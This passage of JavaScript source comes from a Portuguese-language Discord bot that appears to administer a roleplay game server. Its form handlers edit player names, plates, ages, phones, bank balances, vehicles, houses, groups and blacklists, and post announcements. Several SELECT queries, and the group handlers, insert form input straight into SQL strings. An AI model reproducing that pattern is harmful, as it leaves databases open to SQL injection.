                  iconURL: interaction.guild.iconURL({ dynamic: true }),
                })
                .setDescription(`Olá ${interaction.user}, aqui estão as contas do usuario: <@${donoID}>`)
                .addFields({
                  name: "Usuários:",
                  value: `${usersList}`
                })
                .setFooter({ text: `Copyright © `+ config.geral.nome_servidor })
                .setImage(`${config.imagens.ticket_footer}`),
            ],
            ephemeral: true,
          });
        });
        }
      );
    }
  );
}
// --------------------------------- [ MODULOS DE EXECUÇÃO IDENTIDADE ] --------------------------------------------------

if (interaction.isModalSubmit() && interaction.customId === "modal_info_player_nome") {
  let jogador = interaction.fields.getTextInputValue("client_update_idnome");
  let novonome = interaction.fields.getTextInputValue("client_novo_nome");
  let novosobrenome = interaction.fields.getTextInputValue("client_novo_sobrenome");
  connection.query(
    `SELECT * FROM ${config.wl.nome_tabela_identidade} WHERE user_id = ${jogador}`,
    function (err, result, fields) {
      if (err) throw err;
      if (result.length === 0) {
        interaction.reply({
          embeds: [
            new Discord.EmbedBuilder()
              .setColor(config.embeds_color.embed_success)
              .setDescription(
                `❌ | Olá ${interaction.user}, jogador inexistente!.`
              ),
          ],
          ephemeral: true,
        });
        return;
      } else {
        const query = connection.format(
          `UPDATE ?? SET name = ?, firstname = ? WHERE user_id = ?`,
          [config.wl.nome_tabela_identidade, novonome, novosobrenome, jogador]
        );
        connection.query(query, (err, rows) => {
          if (err) {
            console.error(err);
            return interaction.reply({
              content: "Ocorreu um erro ao renomear o jogador.",
              ephemeral: true,
            });
          }
          interaction.guild.channels.cache
            .get(config.geral.canal_logs)
            .send({
              embeds: [
                new Discord.EmbedBuilder()
                  .setColor(config.embeds_color.embed_success)
                  .setAuthor({
                    name: interaction.guild.name,
                    iconURL: interaction.guild.iconURL({ dynamic: true }),
                  })
                  .setTitle(`Registro de RENOMEAR | ${config.geral.nome_servidor} `)
                  .setDescription(
                    `>>> **[ID]: ${jogador}**\n**TEVE SEU NOME ALTERADO PARA: **\n **[NOME]:** ${novonome} ${novosobrenome}\n **[TROCA REALIZADA POR]:** <@${interaction.user.id}>`
                  )
                  .setImage(`${config.imagens.ticket_footer}`),
              ],
            });
          interaction.reply({
            embeds: [
              new Discord.EmbedBuilder()
                .setColor(config.embeds_color.embed_success)
                .setDescription(
                  `✅ | Olá ${interaction.user}, jogador renomeado com sucesso!.`
                ),
            ],
            ephemeral: true,
          });
        });
      }
    }
  );

}
if (interaction.isModalSubmit() && interaction.customId === "modal_info_player_placa") {
  let jogador = interaction.fields.getTextInputValue("client_update_placa");
  let novaplaca = interaction.fields.getTextInputValue("client_nova_placa");
 
  connection.query(
    `SELECT * FROM ${config.wl.nome_tabela_identidade} WHERE user_id = ${jogador}`,
    function (err, result, fields) {
      if (err) throw err;
      if (result.length === 0) {
        interaction.reply({
          embeds: [
            new Discord.EmbedBuilder()
              .setColor(config.embeds_color.embed_success)
              .setDescription(
                `❌ | Olá ${interaction.user}, jogador inexistente!.`
              ),
          ],
          ephemeral: true,
        });
        return;
      } else {
        const query = connection.format(
          `UPDATE ?? SET registration = ? WHERE user_id = ?`,
          [config.wl.nome_tabela_identidade, novaplaca, jogador]
        );
        connection.query(query, (err, rows) => {
          if (err) {
            console.error(err);
            return interaction.reply({
              content: "Ocorreu um erro ao atualizar o jogador.",
              ephemeral: true,
            });
          }
          interaction.guild.channels.cache
            .get(config.geral.canal_logs)
            .send({
              embeds: [
                new Discord.EmbedBuilder()
                  .setColor(config.embeds_color.embed_success)
                  .setAuthor({
                    name: interaction.guild.name,
                    iconURL: interaction.guild.iconURL({ dynamic: true }),
                  })
                  .setTitle(`Registro de TROCA DE RG + PLACA | ${config.geral.nome_servidor} `)
                  .setDescription(
                    `>>> **[ID]: ${jogador}**\n**TEVE SUA PLACA ALTERADA PARA: **\n **[PLACA]:** ${novaplaca}\n **[TROCA REALIZADA POR]:** <@${interaction.user.id}>`
                  )
                  .setImage(`${config.imagens.ticket_footer}`),
              ],
            });
          interaction.reply({
            embeds: [
              new Discord.EmbedBuilder()
                .setColor(config.embeds_color.embed_success)
                .setDescription(
                  `✅ | Olá ${interaction.user}, Registro do jogador alterada com sucesso!.`
                ),
            ],
            ephemeral: true,
          });
        });
      }
    }
  );

}
if (interaction.isModalSubmit() && interaction.customId === "modal_info_player_idade") {
  let jogador = interaction.fields.getTextInputValue("client_update_idnome");
  let novaidade = interaction.fields.getTextInputValue("client_nova_idade");
 
  connection.query(
    `SELECT * FROM ${config.wl.nome_tabela_identidade} WHERE user_id = ${jogador}`,
    function (err, result, fields) {
      if (err) throw err;
      if (result.length === 0) {
        interaction.reply({
          embeds: [
            new Discord.EmbedBuilder()
              .setColor(config.embeds_color.embed_success)
              .setDescription(
                `❌ | Olá ${interaction.user}, jogador inexistente!.`
              ),
          ],
          ephemeral: true,
        });
        return;
      } else {
        const query = connection.format(
          `UPDATE ?? SET age = ? WHERE user_id = ?`,
          [config.wl.nome_tabela_identidade, novaidade, jogador]
        );
        connection.query(query, (err, rows) => {
          if (err) {
            console.error(err);
            return interaction.reply({
              content: "Ocorreu um erro ao atualizar o jogador.",
              ephemeral: true,
            });
          }
          interaction.guild.channels.cache
            .get(config.geral.canal_logs)
            .send({
              embeds: [
                new Discord.EmbedBuilder()
                  .setColor(config.embeds_color.embed_success)
                  .setAuthor({
                    name: interaction.guild.name,
                    iconURL: interaction.guild.iconURL({ dynamic: true }),
                  })
                  .setTitle(`Registro de TROCA DE IDADE | ${config.geral.nome_servidor} `)
                  .setDescription(
                    `>>> **[ID]: ${jogador}**\n**TEVE SUA IDADE ALTERADO PARA: **\n **[IDADE]:** ${novaidade}\n **[TROCA REALIZADA POR]:** <@${interaction.user.id}>`
                  )
                  .setImage(`${config.imagens.ticket_footer}`),
              ],
            });
          interaction.reply({
            embeds: [
              new Discord.EmbedBuilder()
                .setColor(config.embeds_color.embed_success)
                .setDescription(
                  `✅ | Olá ${interaction.user}, Idade do jogador alterada com sucesso!.`
                ),
            ],
            ephemeral: true,
          });
        });
      }
    }
  );

}
if (interaction.isModalSubmit() && interaction.customId === "modal_info_player_telefone"){
  let jogador = interaction.fields.getTextInputValue("client_update_telefone");
  let novotelefone = interaction.fields.getTextInputValue("client_novo_telefone");
 
  connection.query(
    `SELECT * FROM ${config.wl.nome_tabela_identidade} WHERE user_id = ${jogador}`,
    function (err, result, fields) {
      if (err) throw err;
      if (result.length === 0) {
        interaction.reply({
          embeds: [
            new Discord.EmbedBuilder()
              .setColor(config.embeds_color.embed_success)
              .setDescription(
                `❌ | Olá ${interaction.user}, jogador inexistente!.`
              ),
          ],
          ephemeral: true,
        });
        return;
      } else {
        const query = connection.format(
          `UPDATE ?? SET phone = ? WHERE user_id = ?`,
          [config.wl.nome_tabela_identidade, novotelefone, jogador]
        );
        connection.query(query, (err, rows) => {
          if (err) {
            console.error(err);
            return interaction.reply({
              content: "Ocorreu um erro ao atualizar o jogador.",
              ephemeral: true,
            });
          }
          interaction.guild.channels.cache
            .get(config.geral.canal_logs)
            .send({
              embeds: [
                new Discord.EmbedBuilder()
                  .setColor(config.embeds_color.embed_success)
                  .setAuthor({
                    name: interaction.guild.name,
                    iconURL: interaction.guild.iconURL({ dynamic: true }),
                  })
                  .setTitle(`Registro de TROCA DE TELEFONE | ${config.geral.nome_servidor} `)
                  .setDescription(
                    `>>> **[ID]: ${jogador}**\n**TEVE SEU TELEFONE ALTERADO PARA: **\n **[TELEFONE]:** ${novotelefone}\n **[TROCA REALIZADA POR]:** <@${interaction.user.id}>`
                  )
                  .setImage(`${config.imagens.ticket_footer}`),
              ],
            });
          interaction.reply({
            embeds: [
              new Discord.EmbedBuilder()
                .setColor(config.embeds_color.embed_success)
                .setDescription(
                  `✅ | Olá ${interaction.user}, Telefone do jogador alterada com sucesso!.`
                ),
            ],
            ephemeral: true,
          });
        });
      }
    }
  );
}

// --------------------------------- [ MODULOS DE EXECUÇÃO ADICIONAR ] --------------------------------------------------
if (interaction.isModalSubmit() && interaction.customId === "modal_add_dinheiro") {
  let jogador = interaction.fields.getTextInputValue("client_update_idnome");
  var novovalor = interaction.fields.getTextInputValue("client_valor");
  var saldo
  connection.query(
    `SELECT * FROM ${config.wl.nome_tabela_dinheiro} WHERE user_id = ${jogador}`,
    function (err, result, fields) {
      if (err) throw err;
      if (result.length === 0) {
        interaction.reply({
          embeds: [
            new Discord.EmbedBuilder()
              .setColor(config.embeds_color.embed_success)
              .setDescription(
                `❌ | Olá ${interaction.user}, jogador inexistente!.`
              ),
          ],
          ephemeral: true,
        });
        return;
      } else {
        saldo = result[0].bank
        const query = connection.format(
          `UPDATE ?? SET bank = ? WHERE user_id = ?`,
          [config.wl.nome_tabela_dinheiro,parseInt(saldo) + parseInt(novovalor), jogador]
        );
        connection.query(query, (err, rows) => {
          if (err) {
            console.error(err);
            return interaction.reply({
              content: "Ocorreu um erro ao atualizar o jogador.",
              ephemeral: true,
            });
          }
          interaction.guild.channels.cache
            .get(config.geral.canal_logs)
            .send({
              embeds: [
                new Discord.EmbedBuilder()
                  .setColor(config.embeds_color.embed_success)
                  .setAuthor({
                    name: interaction.guild.name,
                    iconURL: interaction.guild.iconURL({ dynamic: true }),
                  })
                  .setTitle(`Registro de ADICIONAR DINHEIRO | ${config.geral.nome_servidor} `)
                  .setDescription(
                    `>>> **[ID]: ${jogador}**\n**TEVE O SALDO BANCARIO ALTERADO: **\n **[SALDO]:**${parseInt(saldo) + parseInt(novovalor)}\n[SALDO ANTERIOR]:${parseInt(saldo)}\n[ADICIONADO]:${parseInt(novovalor)} \n **[TROCA REALIZADA POR]:** <@${interaction.user.id}>`
                  )
                  .setImage(`${config.imagens.ticket_footer}`),
              ],
            });
          interaction.reply({
            embeds: [
              new Discord.EmbedBuilder()
                .setColor(config.embeds_color.embed_success)
                .setDescription(
                  `✅ | Olá ${interaction.user}, Dinheiro adicionado com sucesso!.`
                ),
            ],
            ephemeral: true,
          });
        });
      }
    }
  );

}
if (interaction.isModalSubmit() && interaction.customId === "modal_vehicle_player") {
  let jogador = interaction.fields.getTextInputValue("client_update_idnome");
  var nomecarro = interaction.fields.getTextInputValue("client_novo_nome");
  var saldo
  connection.query(
    `SELECT * FROM ${config.wl.nome_tabela_identidade} WHERE user_id = ${jogador}`,
    function (err, result, fields) {
      if (err) throw err;
      if (result.length === 0) {
        interaction.reply({
          embeds: [
            new Discord.EmbedBuilder()
              .setColor(config.embeds_color.embed_success)
              .setDescription(
                `❌ | Olá ${interaction.user}, jogador inexistente!.`
              ),
          ],
          ephemeral: true,
        });
        return;
      } else {

        const currentTimeInSeconds = Math.floor(Date.now() / 1000);
        const query = connection.format(
          `INSERT IGNORE INTO ?? SET user_id = ?, vehicle = ?, ipva = ?`,
          [config.wl.nome_tabela_carros, jogador, nomecarro, parseInt(currentTimeInSeconds)]
        );
        
        
        connection.query(query, (err, rows) => {
          if (err) {
            console.error(err);
            return interaction.reply({
              content: "Ocorreu um erro ao atualizar o jogador.",
              ephemeral: true,
            });
          }
          interaction.guild.channels.cache
            .get(config.geral.canal_logs)
            .send({
              embeds: [
                new Discord.EmbedBuilder()
                  .setColor(config.embeds_color.embed_success)
                  .setAuthor({
                    name: interaction.guild.name,
                    iconURL: interaction.guild.iconURL({ dynamic: true }),
                  })
                  .setTitle(`Registro de ADICIONAR VEICULOS| ${config.geral.nome_servidor} `)
                  .setDescription(
                    `>>> **[ID]: ${jogador}**\n**VEICULO ADICIONADO: **\n **[NOME]:**${nomecarro}\n **[ADICIONADO POR]:** <@${interaction.user.id}>`
                  )
                  .setImage(`${config.imagens.ticket_footer}`),
              ],
            });
          interaction.reply({
            embeds: [
              new Discord.EmbedBuilder()
                .setColor(config.embeds_color.embed_success)
                .setDescription(
                  `✅ | Olá ${interaction.user}, Veiculo adicionado com sucesso!.`
                ),
            ],
            ephemeral: true,
          });
        });
      }
    }
  );

}
if (interaction.isModalSubmit() && interaction.customId === "modal_addcasa") {
  let jogador = interaction.fields.getTextInputValue("client_update_idnome");
  var nomecarro = interaction.fields.getTextInputValue("client_novo_nome");
  var saldo
  connection.query(
    `SELECT * FROM ${config.wl.nome_tabela_identidade} WHERE user_id = ${jogador}`,
    function (err, result, fields) {
      if (err) throw err;
      if (result.length === 0) {
        interaction.reply({
          embeds: [
            new Discord.EmbedBuilder()
              .setColor(config.embeds_color.embed_success)
              .setDescription(
                `❌ | Olá ${interaction.user}, jogador inexistente!.`
              ),
          ],
          ephemeral: true,
        });
        return;
      } else {

        const currentTimeInSeconds = Math.floor(Date.now() / 1000);
        const query = connection.format(
          `INSERT IGNORE INTO ?? SET owner = '1', user_id = ?, home = ?, tax = ?`,
          [config.wl.nome_tabela_casas, jogador, nomecarro, parseInt(currentTimeInSeconds)]
        );
        
        
        connection.query(query, (err, rows) => {
          if (err) {
            console.error(err);
            return interaction.reply({
              content: "Ocorreu um erro ao atualizar o jogador.",
              ephemeral: true,
            });
          }
          interaction.guild.channels.cache
            .get(config.geral.canal_logs)
            .send({
              embeds: [
                new Discord.EmbedBuilder()
                  .setColor(config.embeds_color.embed_success)
                  .setAuthor({
                    name: interaction.guild.name,
                    iconURL: interaction.guild.iconURL({ dynamic: true }),
                  })
                  .setTitle(`Registro de ADICIONAR CASAS| ${config.geral.nome_servidor} `)
                  .setDescription(
                    `>>> **[ID]: ${jogador}**\n**CASA ADICIONADA: **\n **[NOME]:**${nomecarro}\n **[ADICIONADO POR]:** <@${interaction.user.id}>`
                  )
                  .setImage(`${config.imagens.ticket_footer}`),
              ],
            });
          interaction.reply({
            embeds: [
              new Discord.EmbedBuilder()
                .setColor(config.embeds_color.embed_success)
                .setDescription(
                  `✅ | Olá ${interaction.user}, Casa adicionado com sucesso!.`
                ),
            ],
            ephemeral: true,
          });
        });
      }
    }
  );

}
if (interaction.isModalSubmit() && interaction.customId === "modal_addgroup") {
  let jogador = interaction.fields.getTextInputValue("client_update_idnome");
  var novocargo = interaction.fields.getTextInputValue("client_novo_nome");

  connection.query(
    `SELECT * FROM ${config.wl.nome_tabela_identidade} WHERE user_id = ${jogador}`,
    function (err, result, fields) {
      if (err) throw err;
      if (result.length === 0) {
        interaction.reply({
          embeds: [
            new Discord.EmbedBuilder()
              .setColor(config.embeds_color.embed_success)
              .setDescription(
                `❌ | Olá ${interaction.user}, jogador inexistente!.`
              ),
          ],
          ephemeral: true,
        });
        return;
      } else {

        connection.query(`SELECT dvalue FROM ${config.wl.nome_tabela_data} WHERE user_id = ${jogador}  AND dkey='vRP:datatable'`, async (err, results, fields) =>{

          if (results.length > 0) {
          const data = JSON.parse(results[0].dvalue);
         // console.log("Grupos antigos: " + JSON.stringify(data.groups));
          if (Array.isArray(data.groups)) {
            data.groups = {};
          }
          data.groups[novocargo] = true;
      
      connection.query(`UPDATE ${config.wl.nome_tabela_data} SET dvalue=? WHERE user_id=? AND dkey='vRP:datatable'`, [JSON.stringify(data), jogador], (err, rows) => {
      });
        
        
          }
          interaction.guild.channels.cache
            .get(config.geral.canal_logs)
            .send({
              embeds: [
                new Discord.EmbedBuilder()
                  .setColor(config.embeds_color.embed_success)
                  .setAuthor({
                    name: interaction.guild.name,
                    iconURL: interaction.guild.iconURL({ dynamic: true }),
                  })
                  .setTitle(`Registro de ADICIONAR CARGO| ${config.geral.nome_servidor} `)
                  .setDescription(
                    `>>> **[ID]: ${jogador}**\n**CARGO ADICIONADO: **\n **[CARGO]:**${novocargo}\n **[ADICIONADO POR]:** <@${interaction.user.id}>`
                  )
                  .setImage(`${config.imagens.ticket_footer}`),
              ],
            });
          interaction.reply({
            embeds: [
              new Discord.EmbedBuilder()
                .setColor(config.embeds_color.embed_success)
                .setDescription(
                  `✅ | Olá ${interaction.user}, Cargo adicionado com sucesso!.`
                ),
            ],
            ephemeral: true,
          });
        });
      }
    }
  );

}




// --------------------------------- [ MODULOS DE EXECUÇÃO REMOVER ] --------------------------------------------------
if (interaction.isModalSubmit() && interaction.customId === "modal_info_remove_din") {
  let jogador = interaction.fields.getTextInputValue("client_update_idnome");
  var novovalor = interaction.fields.getTextInputValue("client_novo_valor");
  var saldo
  connection.query(
    `SELECT * FROM ${config.wl.nome_tabela_dinheiro} WHERE user_id = ${jogador}`,
    function (err, result, fields) {
      if (err) throw err;
      if (result.length === 0) {
        interaction.reply({
          embeds: [
            new Discord.EmbedBuilder()
              .setColor(config.embeds_color.embed_success)
              .setDescription(
                `❌ | Olá ${interaction.user}, jogador inexistente!.`
              ),
          ],
          ephemeral: true,
        });
        return;
      } else {
        saldo = result[0].bank
        const query = connection.format(
          `UPDATE ?? SET bank = ? WHERE user_id = ?`,
          [config.wl.nome_tabela_dinheiro,parseInt(saldo) - parseInt(novovalor), jogador]
        );
        connection.query(query, (err, rows) => {
          if (err) {
            console.error(err);
            return interaction.reply({
              content: "Ocorreu um erro ao atualizar o jogador.",
              ephemeral: true,
            });
          }
          interaction.guild.channels.cache
            .get(config.geral.canal_logs)
            .send({
              embeds: [
                new Discord.EmbedBuilder()
                  .setColor(config.embeds_color.embed_success)
                  .setAuthor({
                    name: interaction.guild.name,
                    iconURL: interaction.guild.iconURL({ dynamic: true }),
                  })
                  .setTitle(`Registro de REMOVER DINHEIRO | ${config.geral.nome_servidor} `)
                  .setDescription(
                    `>>> **[ID]: ${jogador}**\n**TEVE O SALDO BANCARIO ALTERADO: **\n **[SALDO]:**${parseInt(saldo) - parseInt(novovalor)}\n[SALDO ANTERIOR]:${parseInt(saldo)}\n[REMOVIDO]:${parseInt(novovalor)} \n **[TROCA REALIZADA POR]:** <@${interaction.user.id}>`
                  )
                  .setImage(`${config.imagens.ticket_footer}`),
              ],
            });
          interaction.reply({
            embeds: [
              new Discord.EmbedBuilder()
                .setColor(config.embeds_color.embed_success)
                .setDescription(
                  `✅ | Olá ${interaction.user}, Dinheiro removido com sucesso!.`
                ),
            ],
            ephemeral: true,
          });
        });
      }
    }
  );

}
if (interaction.isModalSubmit() && interaction.customId === "modal_info_remveh") {
  let jogador = interaction.fields.getTextInputValue("client_update_idnome");
  var nomecarro = interaction.fields.getTextInputValue("client_novo_nome");
  var saldo
  connection.query(
    `SELECT * FROM ${config.wl.nome_tabela_carros} WHERE user_id = ${jogador} AND vehicle = '${nomecarro}'`,
    function (err, result, fields) {
      if (err) throw err;
      if (result.length === 0) {
        interaction.reply({
          embeds: [
            new Discord.EmbedBuilder()
              .setColor(config.embeds_color.embed_success)
              .setDescription(
                `❌ | Olá ${interaction.user}, Não encontrei o veiculo ${nomecarro} para este jogador!.`
              ),
          ],
          ephemeral: true,
        });
        return;
      } else {

      
        const query = connection.format(
          `DELETE FROM ?? WHERE user_id = ? AND vehicle = ?`,
          [config.wl.nome_tabela_carros, jogador, nomecarro]
        );
        
      
        connection.query(query, (err, rows) => {
          if (err) {
            console.error(err);
            return interaction.reply({
              content: "Ocorreu um erro ao atualizar o jogador.",
              ephemeral: true,
            });
          }
          interaction.guild.channels.cache
            .get(config.geral.canal_logs)
            .send({
              embeds: [
                new Discord.EmbedBuilder()
                  .setColor(config.embeds_color.embed_success)
                  .setAuthor({
                    name: interaction.guild.name,
                    iconURL: interaction.guild.iconURL({ dynamic: true }),
                  })
                  .setTitle(`Registro de REMOVER VEICULOS| ${config.geral.nome_servidor} `)
                  .setDescription(
                    `>>> **[ID]: ${jogador}**\n**VEICULO REMOVIDO: **\n **[NOME]:**${nomecarro}\n **[REMOVIDO POR]:** <@${interaction.user.id}>`
                  )
                  .setImage(`${config.imagens.ticket_footer}`),
              ],
            });
          interaction.reply({
            embeds: [
              new Discord.EmbedBuilder()
                .setColor(config.embeds_color.embed_success)
                .setDescription(
                  `✅ | Olá ${interaction.user}, Veiculo removido com sucesso!.`
                ),
            ],
            ephemeral: true,
          });
        });
      }
    }
  );

}
if (interaction.isModalSubmit() && interaction.customId === "modal_remcasa") {
  let jogador = interaction.fields.getTextInputValue("client_update_idnome");
  var nomecarro = interaction.fields.getTextInputValue("client_novo_nome");
  var saldo
  connection.query(
    `SELECT * FROM ${config.wl.nome_tabela_identidade} WHERE user_id = ${jogador}`,
    function (err, result, fields) {
      if (err) throw err;
      if (result.length === 0) {
        interaction.reply({
          embeds: [
            new Discord.EmbedBuilder()
              .setColor(config.embeds_color.embed_success)
              .setDescription(
                `❌ | Olá ${interaction.user}, jogador inexistente!.`
              ),
          ],
          ephemeral: true,
        });
        return;
      } else {

        const currentTimeInSeconds = Math.floor(Date.now() / 1000);
        const query = connection.format(
          `DELETE FROM ?? WHERE user_id = ? AND home = ?`,
          [config.wl.nome_tabela_casas, jogador, nomecarro]
        );
        
        
        connection.query(query, (err, rows) => {
          if (err) {
            console.error(err);
            return interaction.reply({
              content: "Ocorreu um erro ao atualizar o jogador.",
              ephemeral: true,
            });
          }
          interaction.guild.channels.cache
            .get(config.geral.canal_logs)
            .send({
              embeds: [
                new Discord.EmbedBuilder()
                  .setColor(config.embeds_color.embed_success)
                  .setAuthor({
                    name: interaction.guild.name,
                    iconURL: interaction.guild.iconURL({ dynamic: true }),
                  })
                  .setTitle(`Registro de REMOVER CASAS| ${config.geral.nome_servidor} `)
                  .setDescription(
                    `>>> **[ID]: ${jogador}**\n**CASA REMOVIDA: **\n **[NOME]:**${nomecarro}\n **[REMOVIDO POR]:** <@${interaction.user.id}>`
                  )
                  .setImage(`${config.imagens.ticket_footer}`),
              ],
            });
          interaction.reply({
            embeds: [
              new Discord.EmbedBuilder()
                .setColor(config.embeds_color.embed_success)
                .setDescription(
                  `✅ | Olá ${interaction.user}, Casa removida com sucesso!.`
                ),
            ],
            ephemeral: true,
          });
        });
      }
    }
  );

}
if (interaction.isModalSubmit() && interaction.customId === "modal_info_rembl") {
  let jogador = interaction.fields.getTextInputValue("client_update_idnome");
  var nomecarro = interaction.fields.getTextInputValue("client_novo_nome");
  var saldo
  connection.query(
    `SELECT * FROM ${config.wl.nome_tabela_identidade} WHERE user_id = ${jogador}`,
    function (err, result, fields) {
      if (err) throw err;
      if (result.length === 0) {
        interaction.reply({
          embeds: [
            new Discord.EmbedBuilder()
              .setColor(config.embeds_color.embed_success)
              .setDescription(
                `❌ | Olá ${interaction.user}, jogador inexistente!.`
              ),
          ],
          ephemeral: true,
        });
        return;
      } else {

        const currentTimeInSeconds = Math.floor(Date.now() / 1000);
        const query = connection.format(
          `DELETE FROM ?? WHERE user_id = ? AND dkey = ?`,
          [config.wl.nome_tabela_data, jogador, config.wl.blacklist]
        );
        
        
        connection.query(query, (err, rows) => {
          if (err) {
            console.error(err);
            return interaction.reply({
              content: "Ocorreu um erro ao atualizar o jogador.",
              ephemeral: true,
            });
          }
          interaction.guild.channels.cache
            .get(config.geral.canal_logs)
            .send({
              embeds: [
                new Discord.EmbedBuilder()
                  .setColor(config.embeds_color.embed_success)
                  .setAuthor({
                    name: interaction.guild.name,
                    iconURL: interaction.guild.iconURL({ dynamic: true }),
                  })
                  .setTitle(`Registro de REMOVER Blacklist| ${config.geral.nome_servidor} `)
                  .setDescription(
                    `>>> **[ID]: ${jogador}**\n**BLACKLIST REMOVIDA: **\n **[MOTIVO]: ** \n ${nomecarro} **[REMOVIDO POR]:** <@${interaction.user.id}>`
                  )
                  .setImage(`${config.imagens.ticket_footer}`),
              ],
            });
          interaction.reply({
            embeds: [
              new Discord.EmbedBuilder()
                .setColor(config.embeds_color.embed_success)
                .setDescription(
                  `✅ | Olá ${interaction.user}, Blacklist removida com sucesso!.`
                ),
            ],
            ephemeral: true,
          });
        });
      }
    }
  );

}
if (interaction.isModalSubmit() && interaction.customId === "modal_info_remgp") {
  let jogador = interaction.fields.getTextInputValue("client_update_idnome");
  var nomecargo = interaction.fields.getTextInputValue("client_novo_nome");
  var saldo
  connection.query(
    `SELECT * FROM ${config.wl.nome_tabela_identidade} WHERE user_id = ${jogador}`,
    function (err, result, fields) {
      if (err) throw err;
      if (result.length === 0) {
        interaction.reply({
          embeds: [
            new Discord.EmbedBuilder()
              .setColor(config.embeds_color.embed_success)
              .setDescription(
                `❌ | Olá ${interaction.user}, jogador inexistente!.`
              ),
          ],
          ephemeral: true,
        });
        return;
      } else {

        connection.query(`SELECT dvalue FROM ${config.wl.nome_tabela_data} WHERE user_id = ${jogador}  AND dkey='vRP:datatable'`, async (err, results, fields) =>{
          if (results.length > 0) {
          const data = JSON.parse(results[0].dvalue);
            if (!Array.isArray(data.groups)) delete data.groups[nomecargo];
            connection.query(`UPDATE ${config.wl.nome_tabela_data} SET dvalue=? WHERE user_id=? AND dkey='vRP:datatable'`, [JSON.stringify(data), jogador], (err, rows) => {
          });
          
          //interaction.reply(`O usuário do ID **${jogador}** teve o grupo **${nomecargo}** retirado!\n\n Agora, ele possui os seguintes grupos: **${JSON.stringify(data.groups)}**.`);
      
          }
        
          
          interaction.guild.channels.cache
            .get(config.geral.canal_logs)
            .send({
              embeds: [
                new Discord.EmbedBuilder()
                  .setColor(config.embeds_color.embed_success)
                  .setAuthor({
                    name: interaction.guild.name,
                    iconURL: interaction.guild.iconURL({ dynamic: true }),
                  })
                  .setTitle(`Registro de REMOVER CARGO| ${config.geral.nome_servidor} `)
                  .setDescription(
                    `>>> **[ID]: ${jogador}**\n**CARGO REMOVIDO: **\n **[CARGO]: ** \n ${nomecargo} **[REMOVIDO POR]:** <@${interaction.user.id}>`
                  )
                  .setImage(`${config.imagens.ticket_footer}`),
              ],
            });
          interaction.reply({
            embeds: [
              new Discord.EmbedBuilder()
                .setColor(config.embeds_color.embed_success)
                .setDescription(
                  `✅ | Olá ${interaction.user}, cargo removida com sucesso!.`
                ),
            ],
            ephemeral: true,
          });
        });
      }
    }
  );

}
// --------------------------------- [ MODULO GERAL DE EXECUÇÃO ] --------------------------------------------------


 if (interaction.isButton() && interaction.customId === "anunciar_servidor") {
      const modal = new Discord.ModalBuilder()
        .setCustomId("modal_anunciar")
        .setTitle(`Anunciar`);

      const client_info_player_id = new Discord.TextInputBuilder()
        .setCustomId("client_canal")
        .setLabel("Qual é o ID do canal?")
        .setRequired(true)
        .setMaxLength(50)
        .setStyle(1)
        .setPlaceholder("");
      const client_info_player_titulo = new Discord.TextInputBuilder()
        .setCustomId("client_titulo")
        .setLabel("Qual é o titulo da mensagem?")
        .setRequired(true)
        .setMaxLength(300)
        .setStyle(1)
        .setPlaceholder("");
      const client_info_player_nome = new Discord.TextInputBuilder()
        .setCustomId("client_mensagem")
        .setLabel("Qual é a mensagem?")
        .setRequired(true)
        .setMaxLength(4000)
        .setStyle(2)
        .setPlaceholder("");
      const client_info_player_sobrenome = new Discord.TextInputBuilder()
        .setCustomId("client_link")
        .setLabel("Qual é o link?")
        .setRequired(false)
        .setMaxLength(500)
        .setStyle(1)
        .setPlaceholder("");
      const client_info_player_mens = new Discord.TextInputBuilder()
        .setCustomId("client_mens")
        .setLabel("Mencionar um cargo?")
        .setRequired(false)
        .setMaxLength(100)
        .setStyle(1)
        .setPlaceholder("ID DO CARGO");





      modal.addComponents(
        new Discord.ActionRowBuilder().addComponents(client_info_player_id),
        new Discord.ActionRowBuilder().addComponents(client_info_player_titulo),
        new Discord.ActionRowBuilder().addComponents(client_info_player_mens),
        new Discord.ActionRowBuilder().addComponents(client_info_player_nome),
        new Discord.ActionRowBuilder().addComponents(client_info_player_sobrenome)
      );

      return interaction.showModal(modal);
    }
    if (interaction.isButton() && interaction.customId === "falar_servidor") {
      const modal = new Discord.ModalBuilder()
        .setCustomId("modal_falar")
        .setTitle(`Anunciar`);

      const client_info_player_id = new Discord.TextInputBuilder()
        .setCustomId("client_canal")
        .setLabel("Qual é o ID do canal?")
        .setRequired(true)
        .setMaxLength(50)
        .setStyle(1)
        .setPlaceholder("");
      const client_info_player_mens = new Discord.TextInputBuilder()
        .setCustomId("client_mens")
        .setLabel("Mencionar um cargo?")
        .setRequired(false)
        .setMaxLength(50)
        .setStyle(1)
        .setPlaceholder("ID DO CARGO");
      const client_info_player_nome = new Discord.TextInputBuilder()
        .setCustomId("client_mensagem")
        .setLabel("Qual é a mensagem?")
        .setRequired(true)
        .setMaxLength(4000)
        .setStyle(2)
        .setPlaceholder("");


      modal.addComponents(
        new Discord.ActionRowBuilder().addComponents(client_info_player_id),
        new Discord.ActionRowBuilder().addComponents(client_info_player_mens),
        new Discord.ActionRowBuilder().addComponents(client_info_player_nome),

      );

      return interaction.showModal(modal);
    }
if (interaction.isButton() && interaction.customId === "limpar_servidor") {
  const modal = new Discord.ModalBuilder()
    .setCustomId("modal_limpar")
    .setTitle(`Limpar mensagens`);

  const client_info_player_id = new Discord.TextInputBuilder()
    .setCustomId("client_canal")
    .setLabel("Qual é o ID do canal?")
    .setRequired(true)
    .setMaxLength(50)
    .setStyle(1)
    .setPlaceholder("");
  const client_info_player_nome = new Discord.TextInputBuilder()
    .setCustomId("client_mensagem")
    .setLabel("Quantas mensagens?")
    .setRequired(true)
    .setMaxLength(250)
    .setStyle(2)
    .setPlaceholder("maximo 99");


  modal.addComponents(
    new Discord.ActionRowBuilder().addComponents(client_info_player_id),
    new Discord.ActionRowBuilder().addComponents(client_info_player_nome),
  );

  return interaction.showModal(modal);
}
if (interaction.isButton() && interaction.customId === "sorteio_servidor") {
  
  const modal = new Discord.ModalBuilder()
    .setCustomId("modal_sorteio")
    .setTitle(`Mensagem`);

  const client_info_player_id = new Discord.TextInputBuilder()
    .setCustomId("client_canal")
    .setLabel("Qual é o ID do Membro?")
    .setRequired(true)
    .setMaxLength(50)
    .setStyle(1)
    .setPlaceholder("");
  const client_info_player_nome = new Discord.TextInputBuilder()
    .setCustomId("client_mensagem")
    .setLabel("Mensagem")
    .setRequired(true)
    .setMaxLength(2000)
    .setStyle(2)
    .setPlaceholder("");


  modal.addComponents(
    new Discord.ActionRowBuilder().addComponents(client_info_player_id),
    new Discord.ActionRowBuilder().addComponents(client_info_player_nome),
  );

  return interaction.showModal(modal);
}


